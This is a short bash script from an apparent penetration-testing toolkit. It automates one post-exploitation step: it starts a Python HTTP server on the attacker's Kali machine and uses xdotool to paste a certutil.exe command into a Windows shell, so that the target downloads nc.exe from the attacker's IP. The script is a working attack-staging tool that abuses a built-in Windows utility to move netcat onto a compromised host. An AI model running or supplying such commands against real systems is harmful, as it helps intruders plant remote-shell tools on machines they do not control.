#!/bin/bash

: '
cmd: upload nc file to server
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form '{"label": "Python port", "type": "number", "name": "port"}'

PYTHON_PORT=${form_data["port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server ${PYTHON_PORT} &
HTTP_PID=$!

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${PYTHON_PORT}/nc.exe nc.exe"
xdotool key Return
sleep 60

kill $HTTP_PID